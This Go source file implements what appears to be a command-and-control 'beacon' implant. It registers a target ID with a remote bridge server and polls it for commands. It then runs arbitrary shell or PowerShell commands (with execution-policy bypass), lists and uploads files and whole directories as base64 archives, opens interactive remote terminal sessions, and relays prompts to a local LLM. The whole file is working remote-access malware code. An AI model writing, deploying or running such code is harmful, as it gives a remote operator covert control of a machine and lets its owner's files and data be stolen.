package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

var (
	bridgeURL   string
	sablePort   int
	persistDir  string
	localPort   int
	targetID    string
	client      = &http.Client{Timeout: 35 * time.Second}
	ptySessions sync.Map // sessionID -> *PTYSession
	llmChats    sync.Map // chat_id -> last used time (for reset tracking)
)

func main() {
	flag.StringVar(&bridgeURL, "bridge", "https://sable-bridge.onrender.com", "Bridge server URL")
	flag.IntVar(&sablePort, "sable-port", 8765, "Local Sable HTTP port")
	flag.IntVar(&localPort, "local-port", 18923, "Local diagnostics HTTP port")
	flag.StringVar(&persistDir, "persist-dir", "", "Directory for .beacon_id persistence")
	flag.Parse()

	if persistDir == "" {
		persistDir = filepath.Join(".", "system")
	}

	targetID = loadOrCreateID()
	hostname, _ := os.Hostname()

	log.Printf("[beacon] target=%s host=%s bridge=%s local=:%d", targetID, hostname, bridgeURL, localPort)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Start local diagnostics HTTP server (monitor + replay APIs)
	go startLocalServer()

	// Heartbeat loop
	go heartbeatLoop(ctx, hostname)

	// Long-poll command loop (tight, no sleep)
	commandLoop(ctx)
}

func loadOrCreateID() string {
	os.MkdirAll(persistDir, 0o755)
	idPath := filepath.Join(persistDir, ".beacon_id")
	data, err := os.ReadFile(idPath)
	if err == nil && len(bytes.TrimSpace(data)) > 0 {
		return strings.TrimSpace(string(data))
	}
	id := fmt.Sprintf("%s-%d", mustHostname(), time.Now().UnixNano())
	os.WriteFile(idPath, []byte(id), 0o644)
	return id
}

func mustHostname() string {
	h, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return h
}

// ── Heartbeat ────────────────────────────────────────────────

func heartbeatLoop(ctx context.Context, hostname string) {
	for {
		sendHeartbeat(hostname)
		select {
		case <-ctx.Done():
			return
		case <-time.After(30 * time.Second):
		}
	}
}

func sendHeartbeat(hostname string) {
	payload := map[string]any{
		"target_id":   targetID,
		"hostname":    hostname,
		"platform":    runtime.GOOS + "/" + runtime.GOARCH,
		"engine_type": "sable",
	}
	body, _ := json.Marshal(payload)
	resp, err := client.Post(bridgeURL+"/api/beacon", "application/json", bytes.NewReader(body))
	if err != nil {
		log.Printf("[heartbeat] error: %v", err)
		return
	}
	resp.Body.Close()
}

// ── Command Loop (long-poll) ─────────────────────────────────

func commandLoop(ctx context.Context) {
	for {
		cmds, err := longPoll(ctx)
		if err != nil {
			log.Printf("[poll] error: %v", err)
			select {
			case <-ctx.Done():
				return
			case <-time.After(2 * time.Second):
				continue
			}
		}
		for _, cmd := range cmds {
			go executeAndReport(ctx, cmd)
		}
	}
}

func longPoll(ctx context.Context) ([]Command, error) {
	url := fmt.Sprintf("%s/api/commands/poll?target_id=%s&timeout=25", bridgeURL, targetID)
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return nil, err
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent || resp.StatusCode == http.StatusRequestTimeout {
		return nil, nil
	}

	var result struct {
		Commands []Command `json:"commands"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, err
	}
	return result.Commands, nil
}

type Command struct {
	ID       string          `json:"id"`
	TargetID string          `json:"target_id"`
	Mode     string          `json:"mode"`
	Payload  json.RawMessage `json:"payload"`
}

// ── Execute & Report ─────────────────────────────────────────

func executeAndReport(ctx context.Context, cmd Command) {
	log.Printf("[exec] cmd=%s mode=%s", cmd.ID, cmd.Mode)
	result := executeCommand(ctx, cmd)
	reportResult(cmd.ID, result)
}

func reportResult(commandID string, result map[string]any) {
	payload := map[string]any{
		"command_id": commandID,
		"target_id":  targetID,
		"result":     result,
	}
	body, _ := json.Marshal(payload)
	resp, err := client.Post(bridgeURL+"/api/results", "application/json", bytes.NewReader(body))
	if err != nil {
		log.Printf("[report] error: %v", err)
		return
	}
	resp.Body.Close()
}

func executeCommand(ctx context.Context, cmd Command) map[string]any {
	switch cmd.Mode {
	case "shell":
		return execShell(cmd.Payload)
	case "fs_list":
		return execFSList(cmd.Payload)
	case "fs_download":
		return execFSDownload(cmd.Payload)
	case "llm":
		return execLLM(ctx, cmd.Payload)
	case "llm_reset":
		return execLLMReset(cmd.Payload)
	case "pty_connect":
		return execPTYConnect(cmd.Payload)
	case "pty_disconnect":
		return execPTYDisconnect(cmd.Payload)
	default:
		return map[string]any{"error": fmt.Sprintf("unknown mode: %s", cmd.Mode)}
	}
}

// ── Shell ────────────────────────────────────────────────────

func execShell(payload json.RawMessage) map[string]any {
	var p struct {
		Prompt string `json:"prompt"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		return map[string]any{"error": err.Error()}
	}

	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", p.Prompt)
	} else {
		c = exec.CommandContext(ctx, "sh", "-lc", p.Prompt)
	}

	out, err := c.CombinedOutput()
	result := map[string]any{
		"output":   string(out),
		"exit_code": 0,
	}
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			result["exit_code"] = exitErr.ExitCode()
		} else {
			result["error"] = err.Error()
		}
	}
	return result
}

// ── Filesystem List ──────────────────────────────────────────

func execFSList(payload json.RawMessage) map[string]any {
	var p struct {
		Path string `json:"path"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		return map[string]any{"error": err.Error()}
	}
	if p.Path == "" {
		p.Path = "."
	}

	entries, err := os.ReadDir(p.Path)
	if err != nil {
		return map[string]any{"error": err.Error()}
	}

	items := make([]map[string]any, 0, len(entries))
	for _, e := range entries {
		info, err := e.Info()
		if err != nil {
			continue
		}
		items = append(items, map[string]any{
			"name":        e.Name(),
			"is_dir":      e.IsDir(),
			"size":        info.Size(),
			"modified":    info.ModTime().UTC().Format(time.RFC3339),
			"permissions": info.Mode().String(),
		})
	}

	absPath, _ := filepath.Abs(p.Path)
	return map[string]any{
		"entries": items,
		"path":    absPath,
		"count":   len(items),
	}
}

// ── Filesystem Download ──────────────────────────────────────

func execFSDownload(payload json.RawMessage) map[string]any {
	var p struct {
		Path string `json:"path"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		return map[string]any{"error": err.Error()}
	}

	info, err := os.Stat(p.Path)
	if err != nil {
		return map[string]any{"error": err.Error()}
	}

	if !info.IsDir() {
		data, err := os.ReadFile(p.Path)
		if err != nil {
			return map[string]any{"error": err.Error()}
		}
		return map[string]any{
			"filename": filepath.Base(p.Path),
			"data":     base64.StdEncoding.EncodeToString(data),
			"size":     len(data),
			"is_dir":   false,
		}
	}

	// Directory: tar.gz and base64 encode
	var buf bytes.Buffer
	if err := tarGzDir(p.Path, &buf); err != nil {
		return map[string]any{"error": fmt.Sprintf("tar.gz failed: %v", err)}
	}
	return map[string]any{
		"filename": filepath.Base(p.Path) + ".tar.gz",
		"data":     base64.StdEncoding.EncodeToString(buf.Bytes()),
		"size":     buf.Len(),
		"is_dir":   true,
	}
}

// ── LLM Relay ────────────────────────────────────────────────

func execLLM(ctx context.Context, payload json.RawMessage) map[string]any {
	var p struct {
		Prompt  string `json:"prompt"`
		ChatID  string `json:"chat_id"`
		Model   string `json:"model"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		return map[string]any{"error": err.Error()}
	}

	localURL := fmt.Sprintf("http://127.0.0.1:%d", sablePort)

	// Create or use existing chat
	chatID := p.ChatID
	if chatID == "" {
		newChat := map[string]any{"title": "Beacon relay"}
		body, _ := json.Marshal(newChat)
		resp, err := client.Post(localURL+"/api/chat/new", "application/json", bytes.NewReader(body))
		if err != nil {
			return map[string]any{"error": fmt.Sprintf("create chat: %v", err)}
		}
		var cr struct {
			ID string `json:"id"`
		}
		json.NewDecoder(resp.Body).Decode(&cr)
		resp.Body.Close()
		chatID = cr.ID
	}

	// Send prompt
	msg := map[string]any{
		"chat_id": chatID,
		"role":    "user",
		"content": p.Prompt,
	}
	body, _ := json.Marshal(msg)
	resp, err := client.Post(localURL+"/api/chat", "application/json", bytes.NewReader(body))
	if err != nil {
		return map[string]any{"error": fmt.Sprintf("send prompt: %v", err)}
	}
	defer resp.Body.Close()

	// Read SSE stream
	var assistantReply strings.Builder
	buf := make([]byte, 4096)
	for {
		n, err := resp.Body.Read(buf)
		if n > 0 {
			chunk := string(buf[:n])
			for _, line := range strings.Split(chunk, "\n") {
				line = strings.TrimSpace(line)
				if strings.HasPrefix(line, "data: ") {
					data := strings.TrimPrefix(line, "data: ")
					if data == "[DONE]" {
						break
					}
					var evt struct {
						Content string `json:"content"`
					}
					if json.Unmarshal([]byte(data), &evt) == nil && evt.Content != "" {
						assistantReply.WriteString(evt.Content)
					}
				}
			}
		}
		if err != nil {
			break
		}
	}

	return map[string]any{
		"reply":    assistantReply.String(),
		"chat_id":  chatID,
		"mode":     "llm",
	}
}

// ── PTY Connect ──────────────────────────────────────────────

func execPTYConnect(payload json.RawMessage) map[string]any {
	var p struct {
		SessionID string `json:"session_id"`
		BridgeWS  string `json:"bridge_ws_url"`
		Cols      int    `json:"cols"`
		Rows      int    `json:"rows"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		return map[string]any{"error": err.Error()}
	}

	if p.Cols == 0 {
		p.Cols = 120
	}
	if p.Rows == 0 {
		p.Rows = 40
	}

	sess, err := StartPTY(p.SessionID, p.BridgeWS, p.Cols, p.Rows)
	if err != nil {
		return map[string]any{"error": fmt.Sprintf("pty start: %v", err)}
	}

	ptySessions.Store(p.SessionID, sess)
	log.Printf("[pty] started session=%s", p.SessionID)

	return map[string]any{
		"status":     "connected",
		"session_id": p.SessionID,
	}
}

// ── PTY Disconnect ───────────────────────────────────────────

func execPTYDisconnect(payload json.RawMessage) map[string]any {
	var p struct {
		SessionID string `json:"session_id"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		return map[string]any{"error": err.Error()}
	}

	if val, ok := ptySessions.LoadAndDelete(p.SessionID); ok {
		sess := val.(*PTYSession)
		sess.Close()
		log.Printf("[pty] closed session=%s", p.SessionID)
	}

	return map[string]any{"status": "disconnected"}
}

// ── LLM Reset ────────────────────────────────────────────────

func execLLMReset(payload json.RawMessage) map[string]any {
	var p struct {
		ChatID string `json:"chat_id"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		return map[string]any{"error": err.Error()}
	}

	localURL := fmt.Sprintf("http://127.0.0.1:%d", sablePort)

	// Delete the chat to reset conversation state
	if p.ChatID != "" {
		req, _ := http.NewRequest("DELETE", localURL+"/api/chat/"+p.ChatID, nil)
		resp, err := client.Do(req)
		if err != nil {
			return map[string]any{"error": fmt.Sprintf("reset failed: %v", err)}
		}
		resp.Body.Close()
		llmChats.Delete(p.ChatID)
		return map[string]any{"status": "reset", "chat_id": p.ChatID}
	}

	// No chat_id: clear all tracked chats
	llmChats.Range(func(key, value any) bool {
		llmChats.Delete(key)
		return true
	})
	return map[string]any{"status": "all_reset"}
}

// ── Local Diagnostics HTTP Server ────────────────────────────

func startLocalServer() {
	mux := http.NewServeMux()

	// Monitor endpoints
	mux.HandleFunc("POST /diag/monitor/register", handleMonitorRegister)
	mux.HandleFunc("POST /diag/monitor/heartbeat", handleMonitorHeartbeat)
	mux.HandleFunc("POST /diag/monitor/inactive", handleMonitorMarkInactive)
	mux.HandleFunc("POST /diag/monitor/unregister", handleMonitorUnregister)
	mux.HandleFunc("GET /diag/monitor/alive", handleMonitorAlive)
	mux.HandleFunc("GET /diag/monitor/sessions", handleMonitorAll)
	mux.HandleFunc("GET /diag/monitor/events", handleMonitorEvents)
	mux.HandleFunc("POST /diag/monitor/probe", handleMonitorProbe)
	mux.HandleFunc("POST /diag/monitor/clear", handleMonitorClear)

	// Replay endpoints
	mux.HandleFunc("POST /diag/replay/start", handleReplayStart)
	mux.HandleFunc("GET /diag/replay/{replay_id}", handleReplayResult)
	mux.HandleFunc("POST /diag/replay/stop", handleReplayStop)
	mux.HandleFunc("GET /diag/replays", handleReplayList)
	mux.HandleFunc("POST /diag/replay/clear", handleReplayClear)

	addr := fmt.Sprintf("127.0.0.1:%d", localPort)
	log.Printf("[diag-server] listening on %s", addr)
	if err := http.ListenAndServe(addr, mux); err != nil {
		log.Printf("[diag-server] error: %v", err)
	}
}
